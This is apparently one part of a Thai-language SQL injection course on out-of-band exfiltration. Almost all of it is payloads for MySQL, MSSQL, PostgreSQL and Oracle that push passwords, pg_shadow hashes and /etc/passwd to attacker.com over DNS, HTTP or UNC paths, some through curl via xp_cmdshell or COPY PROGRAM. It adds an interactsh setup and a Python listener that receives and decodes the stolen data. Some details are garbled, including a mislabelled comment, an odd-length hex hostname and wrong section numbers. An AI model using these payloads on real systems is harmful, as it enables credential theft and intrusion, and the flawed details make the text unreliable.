# Part 028: Out-of-Band (OOB) Injection Advanced

## ภาพรวม

Out-of-Band (OOB) Injection ใช้ channel อื่นนอกจาก HTTP response สำหรับการ exfiltrate ข้อมูล ซึ่งทำให้หลีกเลี่ยง WAF/IDS ได้ง่ายกว่า

**ขั้นตอนที่ 376-395**

---

## 376. OOB Channels

```
1. DNS - ใช้บ่อยที่สุดเพราะ DNS ผ่าน firewall ได้เสมอ
2. HTTP - ส่งข้อมูลผ่าน HTTP request ไปยัง server ที่ควบคุม
3. SMB - Windows environments (via UNC path)
4. FTP - ส่ง data ผ่าน FTP protocol
```

---

## 377. DNS Exfiltration Setup

```
ต้องการ:
1. Domain ที่ควบคุม (attacker.com)
2. NS record ชี้ไปยัง VPS ที่ควบคุม
3. DNS server สำหรับบันทึก queries

Tool:
1. Burp Collaborator (ใน Burp Suite Professional)
2. interactsh (https://github.com/projectdiscovery/interactsh)
3. dnslog.cn (สำหรับทดสอบ)
```

### 77.1 ตั้งค่า interactsh

```bash
# ติดตั้ง
# ดาวน์โหลดจาก https://github.com/projectdiscovery/interactsh
wget https://github.com/projectdiscovery/interactsh/releases/latest/download/interactsh-client_linux_amd64.zip
unzip interactsh-client_linux_amd64.zip
./interactsh-client

# จะได้ URL เช่น:
# [INF] Listing on xxxx.oast.fun

# ใช้ URL นี้ใน DNS payloads
```

---

## 378. MySQL DNS Exfiltration

```sql
-- ต้องการ FILE privilege
-- Windows MSSQL DNS via UNC path
SELECT LOAD_FILE(CONCAT('\\\\', 
  (SELECT HEX(password) FROM users LIMIT 0,1),
  '.attacker.com\\share'));

-- MySQL ผ่าน SQL injection
' UNION SELECT LOAD_FILE(CONCAT(0x5c5c5c5c,
  (SELECT HEX(password) FROM users LIMIT 0,1),
  0x2e61747461636b65722e636f6d5c5c736861726)),2-- -

-- Decode ที่ฝั่งรับ:
# DNS query: 61646d696e.attacker.com
# Decode: unhex('61646d696e') = 'admin'
```

---

## 379. MSSQL DNS Exfiltration

```sql
-- xp_dirtree สร้าง DNS lookup
EXEC xp_dirtree '\\attacker.com\share';

-- พร้อมข้อมูล
DECLARE @data VARCHAR(1024);
SELECT @data = (SELECT TOP 1 password FROM users);
EXEC xp_dirtree ('\\' + @data + '.attacker.com\share');

-- Version info
EXEC xp_dirtree ('\\' + @@version + '.attacker.com\share');

-- ผ่าน injection
'; EXEC xp_dirtree '\\attacker.com\share'-- (test)
'; DECLARE @d varchar(100); SET @d=(SELECT TOP 1 username FROM users); EXEC xp_dirtree ('\\'+@d+'.attacker.com\share')--
```

---

## 380. PostgreSQL OOB ผ่าน dblink

```sql
-- dblink OOB
SELECT dblink_connect(
  'host=' || (SELECT current_user) || '.attacker.com dbname=test user=x password=x'
);

-- ดึง password ผ่าน DNS
SELECT dblink_connect(
  'host=' || (SELECT passwd FROM pg_shadow WHERE usename='postgres') || '.attacker.com dbname=x user=x password=x'
);

-- ผ่าน injection
'; SELECT dblink_connect(''host=''||(SELECT passwd FROM pg_shadow LIMIT 1)||''.attacker.com'');--
```

---

## 381. Oracle DNS Exfiltration

```sql
-- UTL_HTTP (requires EXECUTE on UTL_HTTP)
SELECT UTL_HTTP.REQUEST('http://attacker.com/?data=' || user) FROM dual;

-- UTL_FILE
SELECT UTL_INADDR.GET_HOST_ADDRESS(
  (SELECT user FROM dual) || '.attacker.com'
) FROM dual;

-- DBMS_LDAP
DECLARE
  l_conn DBMS_LDAP.SESSION;
BEGIN
  l_conn := DBMS_LDAP.INIT(
    (SELECT user FROM dual) || '.attacker.com',
    389
  );
END;
```

---

## 382. HTTP-Based OOB

```sql
-- MySQL ผ่าน UDF
SELECT sys_eval(
  CONCAT('curl http://attacker.com/?data=', 
  (SELECT password FROM users LIMIT 1))
);

-- MSSQL ผ่าน xp_cmdshell
EXEC xp_cmdshell 
  'curl http://attacker.com/?data=' + 
  (SELECT TOP 1 password FROM users);

-- PostgreSQL ผ่าน COPY PROGRAM
CREATE TABLE tmp (d text);
COPY tmp FROM PROGRAM 
  'curl http://attacker.com/?data=$(cat /etc/passwd | base64 -w0)';
```

---

## 383. เครื่องมือยิงสำหรับ OOB

```python
#!/usr/bin/env python3
"""
เครื่องมือ DNS logger สำหรับการศึกษาเท่านั้น
"""
from http.server import HTTPServer, BaseHTTPRequestHandler
import urllib.parse

class DNSLogHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        path = self.path
        print(f"[+] OOB Data received: {path}")
        
        # Parse data from URL
        parsed = urllib.parse.urlparse(path)
        params = urllib.parse.parse_qs(parsed.query)
        
        if 'data' in params:
            data = params['data'][0]
            print(f"    Extracted data: {data}")
            try:
                decoded = bytes.fromhex(data).decode('utf-8')
                print(f"    Decoded (hex): {decoded}")
            except:
                pass
        
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b'OK')
    
    def log_message(self, format, *args):
        pass

if __name__ == '__main__':
    server = HTTPServer(('0.0.0.0', 8080), DNSLogHandler)
    print('[*] OOB HTTP Logger listening on port 8080...')
    print('[*] Waiting for DNS/HTTP callbacks...')
    server.serve_forever()
```

---

## สรุป

OOB Injection Advanced:
- **DNS** - channel ที่ดีที่สุด (ผ่าน firewall ได้เสมอ)
- **Tools** - Burp Collaborator, interactsh, dnslog.cn
- **MySQL** - LOAD_FILE() ผ่าน UNC path
- **MSSQL** - xp_dirtree UNC path
- **PostgreSQL** - dblinkสร้าง DNS connection

---

*Part 028 | SQL Injection Course | สำหรับการศึกษาเท่านั้น*
